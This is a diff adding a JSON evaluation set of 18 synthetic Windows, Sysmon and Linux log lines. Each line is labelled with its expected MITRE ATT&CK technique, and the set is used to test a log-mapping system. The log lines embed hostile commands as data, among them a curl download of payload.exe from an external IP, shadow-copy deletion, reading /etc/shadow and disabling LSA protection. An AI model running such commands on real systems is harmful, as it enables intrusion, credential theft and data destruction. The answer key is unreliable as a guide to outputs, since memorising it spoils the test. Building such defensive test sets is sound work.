@@ -1,0 +1,167 @@
+{
+  "about": {
+    "what": "A labelled test set of security log lines for evaluating the MITRE ATT&CK mapper. Each entry has a log line plus the ATT&CK technique that SHOULD be the correct answer, so you can measure whether the RAG system answers correctly.",
+    "important_honesty_note": "These logs are SYNTHETIC but REPRESENTATIVE \u2014 hand-written to look like real Windows Security / Sysmon / auth logs in the style of public datasets. They are NOT scraped from a specific real dataset. They are for functional testing and eval, not a benchmark you should publish accuracy numbers against.",
+    "for_real_raw_data_see": [
+      "EVTX-ATTACK-SAMPLES (Windows EVTX mapped to ATT&CK): https://github.com/sbousseaden/EVTX-ATTACK-SAMPLES",
+      "OTRF Security-Datasets / Mordor (JSON events by ATT&CK): https://github.com/OTRF/Security-Datasets",
+      "Atomic Red Team (tests mapped to ATT&CK): https://github.com/redcanaryco/atomic-red-team",
+      "Splunk Attack Data (per-technique datasets): https://github.com/splunk/attack_data"
+    ],
+    "how_to_use": "Load this file in the eval script (Prompt 5). For each sample, run the log through the pipeline and check whether expected_technique_id appears in (a) the retrieved candidates and (b) the final answer. Report retrieval accuracy and end-to-end accuracy separately.",
+    "field_guide": {
+      "id": "a stable identifier for the test case",
+      "log": "the raw-ish log line fed into the system",
+      "expected_technique_id": "the ATT&CK ID the system SHOULD map this to (ground truth)",
+      "expected_technique_name": "human name of that technique, for your reference",
+      "difficulty": "easy / medium / hard \u2014 how obvious the mapping is",
+      "note": "why this is the answer, or what makes it tricky"
+    }
+  },
+  "samples": [
+    {
+      "id": "log-01",
+      "log": "Sysmon EventID 10 ProcessAccess: SourceImage=C:\\Users\\public\\mimi.exe TargetImage=C:\\Windows\\System32\\lsass.exe GrantedAccess=0x1010 CallTrace=UNKNOWN",
+      "expected_technique_id": "T1003.001",
+      "expected_technique_name": "OS Credential Dumping: LSASS Memory",
+      "difficulty": "easy",
+      "note": "Access to lsass.exe memory by an unknown binary is the textbook LSASS credential-dumping signature."
+    },
+    {
+      "id": "log-02",
+      "log": "Sysmon EventID 1 ProcessCreate: Image=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe CommandLine=\"powershell.exe -nop -w hidden -enc SQBFAFgAKABuAGUAdwAtAG8AYgBqAGUAYwB0AC4A\" ParentImage=C:\\Program Files\\Microsoft Office\\winword.exe",
+      "expected_technique_id": "T1059.001",
+      "expected_technique_name": "Command and Scripting Interpreter: PowerShell",
+      "difficulty": "easy",
+      "note": "Encoded, hidden-window PowerShell spawned by Word. PowerShell execution = T1059.001; the Word parent is a strong malicious signal."
+    },
+    {
+      "id": "log-03",
+      "log": "Security EventID 4688 A new process has been created. New Process Name: C:\\Windows\\System32\\cmd.exe Creator Process Name: C:\\Users\\bob\\invoice.pdf.exe Process Command Line: cmd.exe /c whoami & ipconfig /all",
+      "expected_technique_id": "T1059.003",
+      "expected_technique_name": "Command and Scripting Interpreter: Windows Command Shell",
+      "difficulty": "medium",
+      "note": "cmd.exe running commands = Windows Command Shell. (whoami/ipconfig are also discovery, but the primary execution technique is T1059.003.)"
+    },
+    {
+      "id": "log-04",
+      "log": "Sysmon EventID 13 RegistryEvent (Value Set): TargetObject=HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\Updater Details=C:\\Users\\public\\svc.exe Image=C:\\Users\\public\\svc.exe",
+      "expected_technique_id": "T1547.001",
+      "expected_technique_name": "Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder",
+      "difficulty": "easy",
+      "note": "Writing an executable path into a CurrentVersion\\Run key is classic Run-key persistence."
+    },
+    {
+      "id": "log-05",
+      "log": "Security EventID 4698 A scheduled task was created. Task Name: \\MicrosoftUpdateSync Command: C:\\Users\\public\\beacon.exe Trigger: At logon of any user",
+      "expected_technique_id": "T1053.005",
+      "expected_technique_name": "Scheduled Task/Job: Scheduled Task",
+      "difficulty": "easy",
+      "note": "Creation of a scheduled task that runs a suspicious binary at logon = Scheduled Task persistence/execution."
+    },
+    {
+      "id": "log-06",
+      "log": "Security EventID 4624 An account was successfully logged on. Logon Type: 10 Account Name: administrator Source Network Address: 10.10.14.7 Workstation Name: FILESERVER01",
+      "expected_technique_id": "T1021.001",
+      "expected_technique_name": "Remote Services: Remote Desktop Protocol",
+      "difficulty": "medium",
+      "note": "Logon Type 10 is an interactive remote (RDP) session. Successful RDP logon to another host = Remote Desktop Protocol."
+    },
+    {
+      "id": "log-07",
+      "log": "Security EventID 4625 An account failed to log on. Account Name: administrator Failure Reason: Unknown user name or bad password. Status: 0xC000006D \u2014 repeated 3,000 times in 4 minutes from 45.83.x.x",
+      "expected_technique_id": "T1110",
+      "expected_technique_name": "Brute Force",
+      "difficulty": "easy",
+      "note": "Thousands of failed logons in minutes against one account = password brute forcing."
+    },
+    {
+      "id": "log-08",
+      "log": "Security EventID 4720 A user account was created. New Account: helpdesk_svc Caller: administrator; followed by EventID 4732 member added to group Administrators",
+      "expected_technique_id": "T1136.001",
+      "expected_technique_name": "Create Account: Local Account",
+      "difficulty": "medium",
+      "note": "Creation of a new local account (then added to Administrators) = Create Account (Local). Group-add is a separate technique; primary here is account creation."
+    },
+    {
+      "id": "log-09",
+      "log": "Security EventID 1102 The audit log was cleared. Subject Account Name: administrator",
+      "expected_technique_id": "T1070.001",
+      "expected_technique_name": "Indicator Removal: Clear Windows Event Logs",
+      "difficulty": "easy",
+      "note": "Event 1102 is literally 'the audit log was cleared' \u2014 Clear Windows Event Logs."
+    },
+    {
+      "id": "log-10",
+      "log": "Sysmon EventID 3 NetworkConnect: Image=C:\\Users\\public\\svc.exe DestinationIp=185.220.101.5 DestinationPort=443 followed by 2.3 GB outbound over 20 minutes to the same IP",
+      "expected_technique_id": "T1048",
+      "expected_technique_name": "Exfiltration Over Alternative Protocol",
+      "difficulty": "hard",
+      "note": "Large sustained outbound transfer from a suspicious binary to an external IP suggests data exfiltration. Tricky because it could also read as C2; the volume points to exfiltration."
+    },
+    {
+      "id": "log-11",
+      "log": "Sysmon EventID 1 ProcessCreate: Image=C:\\Windows\\System32\\rundll32.exe CommandLine=\"rundll32.exe C:\\Users\\public\\evil.dll,StartW\" ParentImage=C:\\Windows\\System32\\cmd.exe",
+      "expected_technique_id": "T1218.011",
+      "expected_technique_name": "System Binary Proxy Execution: Rundll32",
+      "difficulty": "medium",
+      "note": "Using the trusted rundll32.exe to run a DLL export is proxy execution via Rundll32."
+    },
+    {
+      "id": "log-12",
+      "log": "Sysmon EventID 1 ProcessCreate: Image=C:\\Windows\\System32\\reg.exe CommandLine=\"reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa /v RunAsPPL /t REG_DWORD /d 0 /f\"",
+      "expected_technique_id": "T1112",
+      "expected_technique_name": "Modify Registry",
+      "difficulty": "hard",
+      "note": "Directly modifying a registry value (here weakening LSA protection). Primary technique is Modify Registry; a strong system might also note it's disabling a defense."
+    },
+    {
+      "id": "log-13",
+      "log": "auditd type=EXECVE Linux: argc=3 a0=\"/bin/bash\" a1=\"-c\" a2=\"cat /etc/passwd; cat /etc/shadow\" uid=1000 comm=\"bash\"",
+      "expected_technique_id": "T1003.008",
+      "expected_technique_name": "OS Credential Dumping: /etc/passwd and /etc/shadow",
+      "difficulty": "medium",
+      "note": "Reading /etc/shadow (hashed passwords) on Linux is the /etc/passwd and /etc/shadow credential-dumping sub-technique."
+    },
+    {
+      "id": "log-14",
+      "log": "Sysmon EventID 1 ProcessCreate: Image=C:\\Windows\\System32\\curl.exe CommandLine=\"curl.exe -o C:\\Users\\public\\payload.exe http://45.155.204.10/payload.exe\"",
+      "expected_technique_id": "T1105",
+      "expected_technique_name": "Ingress Tool Transfer",
+      "difficulty": "easy",
+      "note": "Downloading an executable from an external server onto the host = Ingress Tool Transfer."
+    },
+    {
+      "id": "log-15",
+      "log": "Sysmon EventID 1 ProcessCreate: Image=C:\\Windows\\System32\\net.exe CommandLine=\"net group \\\"Domain Admins\\\" /domain\"",
+      "expected_technique_id": "T1069.002",
+      "expected_technique_name": "Permission Groups Discovery: Domain Groups",
+      "difficulty": "medium",
+      "note": "Enumerating 'Domain Admins' group membership = Domain Groups discovery."
+    },
+    {
+      "id": "log-16",
+      "log": "Sysmon EventID 8 CreateRemoteThread: SourceImage=C:\\Users\\public\\loader.exe TargetImage=C:\\Windows\\System32\\svchost.exe NewThreadStartAddress=0x0 followed by WriteProcessMemory",
+      "expected_technique_id": "T1055",
+      "expected_technique_name": "Process Injection",
+      "difficulty": "medium",
+      "note": "Creating a remote thread + writing memory into another process (svchost) is Process Injection."
+    },
+    {
+      "id": "log-17",
+      "log": "Sysmon EventID 1 ProcessCreate: Image=C:\\Windows\\System32\\vssadmin.exe CommandLine=\"vssadmin.exe delete shadows /all /quiet\"",
+      "expected_technique_id": "T1490",
+      "expected_technique_name": "Inhibit System Recovery",
+      "difficulty": "easy",
+      "note": "Deleting volume shadow copies to prevent recovery = Inhibit System Recovery (classic pre-ransomware step)."
+    },
+    {
+      "id": "log-18",
+      "log": "Sysmon EventID 1 ProcessCreate: Image=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe CommandLine=\"powershell.exe Get-ChildItem\" ParentImage=C:\\Windows\\explorer.exe User=DESKTOP\\alice \u2014 during business hours, no other suspicious activity",
+      "expected_technique_id": "none (benign)",
+      "expected_technique_name": "Benign administrative activity \u2014 should NOT be mapped to an attack",
+      "difficulty": "hard",
+      "note": "A benign PowerShell listing files, launched by Explorer by a normal user. Tests that the system does NOT over-map ordinary activity. A good answer flags low/no confidence rather than forcing a technique."
+    }
+  ]
+}
